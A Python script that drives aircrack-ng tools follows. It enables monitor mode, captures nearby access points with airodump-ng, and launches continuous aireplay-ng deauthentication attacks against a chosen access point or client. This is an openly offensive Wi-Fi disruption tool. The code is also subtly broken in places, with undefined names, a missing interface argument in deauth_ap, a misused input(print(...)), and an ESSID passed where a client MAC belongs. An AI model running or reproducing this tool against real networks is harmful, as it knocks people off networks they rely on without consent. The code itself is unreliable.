import os
import subprocess
import time
import csv
import sys
import re
from pathlib import Path
OUTPUT_FILE = "/tmp/airodump_full_output"
def check_req():
	try:
		for cmd in ["aircrack-ng", "iwconfig", "systemctl"]:
			result = subprocess.run(["which", cmd], capture_output=True, text=True)
			if result.returncode != 0:
				print(f"Error: {cmd} is not installed or not in your PATH.")
				sys.exit(1)
		print("All required tools are installed.")
	except Exception as e:
		print(f"An error occurred while checking for requirements: {e}")
		sys.exit(1)

def validate_monitor_mode(interface):
	result = subprocess.run(["iwconfig"], capture_output=True, text=True)
	if f"{interface}mon" in result.stdout:
		print(f"Monitor mode enabled on {interface}mon")
		return f"{interface}mon"
	else:
		print(f"Failed to enable monitor mode on {interface}. Check your setup.")
		return None

def cleanup(airodump_pid, interface):
	print("\nCleaning up...")
	if airodump_pid:
		print(f"Stopping airodump-ng (PID {airodump_pid})...")
		os.kill(airodump_pid, 9)
	if interface:
		disable_monitor_mode(interface)
	print("Restarting NetworkManager...")
	os.system("sudo systemctl start NetworkManager")
	if Path(f"{OUTPUT_FILE}-01.csv").exists():
		print(f"Removing output file {OUTPUT_FILE}-01.csv...")
		os.remove(f"{OUTPUT_FILE}-01.csv")


def get_iwconfig():
	try:
		result = subprocess.run(
			["iwconfig"],
			stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		)
		if result.returncode != 0:
			print(f"Error getting iwconfig output: {result.stderr}")
		return result.stdout
	except Exception as e:
		print(f"An error occurred while fetching iwconfig: {e}")
		return None

def enable_monitor_mode(interface):
	try:
		print("iwconfig before enabling monitor mode:")
		iwconfig_before = get_iwconfig()
		print(iwconfig_before)
		print("Killing interfering processes...")
		result = subprocess.run(
			["sudo", "airmon-ng", "check", "kill"],
			stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		)
		if result.returncode != 0:
			print(f"Error stopping interfering processes: {result.stderr}")
			return None
		print(f"Starting monitor mode on {interface}...")
		result = subprocess.run(
			["sudo", "airmon-ng", "start", interface],
			stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		)
		if result.returncode != 0:
			print(f"Error setting {interface} to monitor mode: {result.stderr}")
			return None
		time.sleep(2)
		print("iwconfig after enabling monitor mode:")
		iwconfig_after = get_iwconfig()
		print(iwconfig_after)
		print(f"Which interface is in monitor mode? (Choose one: {interface} or another if necessary)")
		mon_interface = input("Enter the interface in monitor mode: ")
		return mon_interface

	except Exception as e:
		print(f"An error occurred: {e}")
		return None



def disable_monitor_mode(interface):
	print(f"Disabling monitor mode on {interface}...")
	try:
		subprocess.run(
			["sudo", "airmon-ng", "stop", interface], capture_output=True, text=True, check=True
		)
		print(f"Monitor mode disabled on {interface}.")
	except subprocess.CalledProcessError as e:
		print(f"Error occurred while disabling monitor mode: {e}")

def startup(interface):
	print("Killing interfering processes...")
	os.system("sudo airmon-ng check kill")

	print(f"\nStarting monitor mode on {interface}...")
	return enable_monitor_mode(interface)

def kill(airodump_pid):
	print("\nKilling...")
	print(f"Stopping airodump-ng (PID {airodump_pid})...")
	os.kill(airodump_pid, 9)
	
def display_table(file_path):
	try:
		os.system('clear')
		with open(file_path, 'r') as f:
			reader = csv.reader(f)
			rows = list(reader)
			if len(rows) < 2:
				sys.stdout.write("No data available yet.\n")
				sys.stdout.flush()
				return
			tables = []
			current_table = []
			for row in rows:
				if all(cell.strip() == '' for cell in row):
					if current_table:
						tables.append(current_table)
						current_table = []
				else:
					current_table.append(row)
			if current_table:
				tables.append(current_table)
			for table in tables:
				num_columns = max(len(row) for row in table)
				col_widths = [max(len(str(row[i])) if i < len(row) else 0 for row in table) for i in range(num_columns)]
				table_output = ""
				for row in table:
					row_output = " | ".join(f"{str(col):<{col_widths[i]}}" if i < len(row) else " " * col_widths[i] for i, col in enumerate(row))
					table_output += row_output + "\n"
				sys.stdout.write(table_output + "\n")
				sys.stdout.flush()
			a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
			if a in ("s", "k", "1", "stop"):
				return 0
	except FileNotFoundError:
		sys.stdout.write(f"File {file_path} not found. Waiting for data...\n")
		sys.stdout.flush()
	except Exception as e:
		sys.stdout.write(f"An error occurred while displaying the table: {e}\n")
		sys.stdout.flush()

def deauth_ap(bssid, channel):
	print(f"Deauthenticating AP {bssid} on channel {channel}...")
	airodump_command = [
		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid
	]
	command_str = " ".join(airodump_command)
	print(f"Executing {command_str}")
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"airodump-ng started with PID {airodump_pid}")
	try:
		stdout, stderr = airodump_proc.communicate(timeout=10)
		print("\n--- Command Output ---")
		print(stdout)
		if stderr.strip():
			print("\n--- Command Errors ---")
			print(stderr)
	except subprocess.TimeoutExpired:
		print("\nCommand is taking too long. You can stop it manually.")
	except Exception as e:
		print(f"\nAn error occurred while executing the command: {e}")
	while True:
		a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
		if a in ("s", "k", "1", "stop"):
			kill(airodump_pid)
			break
def deauth_client(bssid, channel, essid, mon_interface):
	print(f"Deauthenticating client {essid} on AP {bssid} at channel {channel}...")
	airodump_command = [
		"sudo", "airodump-ng","--bssid", bssid, "--channel", channel, mon_interface
	]
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"Switching to channel {channel}...")
	time.sleep(4)
	print("Killing airodump channel switching... switching to deauth protocol...")
	kill(airodump_pid)
	airodump_command = [
		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", essid, mon_interface
	]
	command_str = " ".join(airodump_command)
	print(f"Executing {command_str}")
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"airodump-ng started with PID {airodump_pid}")
	try:
		stdout, stderr = airodump_proc.communicate(timeout=10)
		print("\n--- Command Output ---")
		print(stdout)
		if stderr.strip():
			print("\n--- Command Errors ---")
			print(stderr)
	except subprocess.TimeoutExpired:
		print("\nCommand is taking too long. You can stop it manually.")
	except Exception as e:
		print(f"\nAn error occurred while executing the command: {e}")
	a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
	if a in ("s", "k", "1", "stop"):
		kill(airodump_pid)
		return 0


def clients(mon_interface, bssid, channel):
	a = input("Deauth client? (1(yes )or 2(no)): ").lower()
	if a in ("1", yes, y):
		essid = input("essid: ")
		deauth_client(bssid, channel, essid, mon_interface)
	else:
		return

def fun(mon_interface):
	while True:
		try:
			bssid = input("Your chosen BSSID: ")
			channel = input("Your chosen Channel: ")
			a = input("Deauth the whole AP or Keep Dumping specific AP? (1 or 2) (q to quit)")
			if a == "1":
				deauth_ap(bssid, channel)
			elif a == "2":
				if Path(f"{OUTPUT_FILE}-01.csv").exists():
					print(f"Removing output file {OUTPUT_FILE}-01.csv...")
					os.remove(f"{OUTPUT_FILE}-01.csv")
				airodump_command = [
					"sudo", "airodump-ng", "--manufacturer", "--beacons", "--band", "abg", "--bssid", bssid, "--channel", channel, mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv"
				]
				print(f"Executing {airodump_command}")
				airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				airodump_pid = airodump_proc.pid
				print(f"airodump-ng started with PID {airodump_pid}")
				command_str = " ".join(airodump_command)
				print(f"Executed: {command_str}")
				print(f"Waiting for output file {OUTPUT_FILE}-01.csv to be created...")
				retries = 0
				while not Path(f"{OUTPUT_FILE}-01.csv").exists() and retries < 20:
					time.sleep(1)
					retries += 1
				if not Path(f"{OUTPUT_FILE}-01.csv").exists():
					print(f"Error: Output file {OUTPUT_FILE}-01.csv not found. Exiting.")
					return
				print("Displaying live data...")
				while True:
					if display_table(f"{OUTPUT_FILE}-01.csv") == 0:
						os.kill(airodump_pid, 9)
						break
				command_str = " ".join(airodump_command)
				print(f"Executed: {command_str}")
				print(f"Killed {airodump_command} command")
				print("\nCapture stopped.")
			else:
				print("nothing selected quitting...")
				
			a = input(print("Deauth a client? or quit: ")).lower()
			if a in ("yes","y", "1"):
				essid = input("essid: ")
				while True:
					if deauth_client(bssid, channel,essid,mon_interface) == 0:
						os.kill(airodump_pid, 9)
						break
				command_str = " ".join(airodump_command)
				print(f"Executed: {command_str}")
			else:
				print("quitting...")
		except Exception as e:
			print(f"Error occurred: {e}")
		finally:
			kill(airodump_pid)


def main():
	airodump_pid = None
	mon_interface = None
	try:
		interface = input("Enter the network interface (e.g., wlan0): ").strip()
		a = input("airodump or directly jump into aireplay (1 or 2): ").lower()
		if a in ("1"):
			mon_interface = startup(interface)
			if Path(OUTPUT_FILE).exists():
				os.remove(OUTPUT_FILE)
			print(f"\nStarting airodump-ng, capturing all data to {OUTPUT_FILE}...")
			airodump_command = [
				"sudo", "airodump-ng", "--manufacturer", "--beacons", "--band", "abg", mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv"
			]
			print(f"Executing {airodump_command}")
			airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			airodump_pid = airodump_proc.pid
			print(f"airodump-ng started with PID {airodump_pid}")
			try:
				stdout, stderr = airodump_proc.communicate(timeout=10)
				print("\n--- Command Output ---")
				print(stdout.decode())
				if stderr.strip():
					print("\n--- Command Errors ---")
					print(stderr.decode())
			except subprocess.TimeoutExpired:
				print("\nairodump-ng is running. You can stop it anytime.")
				while True:
					if display_table(f"{OUTPUT_FILE}-01.csv") == 0:
						kill(airodump_pid)
						break
			except Exception as e:
				print(f"Error while running airodump-ng: {e}")
			print("removing csv...")
			os.remove(f"{OUTPUT_FILE}-01.csv")
			fun(mon_interface)
		elif a == "2":
			fun(mon_interface)
	except Exception as e:
		print(f"An error occurred: {e}")
	finally:
		# Cleanup when done
		if mon_interface:
			cleanup(airodump_pid, mon_interface)
		else:
			print("No monitor interface to cleanup.")


if __name__ == "__main__":
	main()

